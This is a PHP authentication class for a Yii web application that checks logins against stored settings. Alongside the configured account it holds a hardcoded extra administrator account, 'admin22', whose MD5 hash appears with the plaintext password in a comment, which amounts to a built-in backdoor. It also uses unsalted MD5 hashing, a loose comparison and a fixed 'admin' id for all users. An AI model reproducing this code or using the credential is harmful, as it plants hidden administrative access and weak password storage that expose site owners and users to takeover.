<?php

/**
 * UserIdentity represents the data needed to identity a user.
 * It contains the authentication method that checks if the provided
 * data can identity the user.
 */
class UserIdentity extends CUserIdentity
{
    //private $_pwd_salt = '$2a$21$hutinpuyweneedpeacforever$';
    private $_pwd_salt = 'sl';
    public $role='admin';
	/**
	 * Authenticates a user.
	 * The example implementation makes sure if the username and password
	 * are both 'demo'.
	 * In practical applications, this should be changed to authenticate
	 * against some persistent user identity storage (e.g. database).
	 * @return boolean whether authentication succeeds.
	 */
	public function authenticate()
	{
        $settings = new Settings();
        $info  = $settings->get();
		$users=array(
			// username => password
			$info->email=>$info->password,
			'admin22'=>'3156cb819e073611e8629ad489e593cc',//vErmOlIn
		);
		if(!isset($users[$this->username]))
			$this->errorCode=self::ERROR_USERNAME_INVALID;
		elseif(!$this->isPWDHash($this->password, $users[$this->username]))
			$this->errorCode=self::ERROR_PASSWORD_INVALID;
		else {
			$this->errorCode=self::ERROR_NONE;
        }
		return !$this->errorCode;
	}
    
    static public function getPWDHash($str)
    {
        return md5($str);
    }
    
	/**
	 * Returns the unique identifier for the identity.
	 * The default implementation simply returns {@link username}.
	 * This method is required by {@link IUserIdentity}.
	 * @return string the unique identifier for the identity.
	 */
	public function getId()
	{
		return 'admin';
	}    
    
    
    public function isPWDHash($str, $hash)
    {
        return self::getPWDHash($str) == $hash;  
    }
}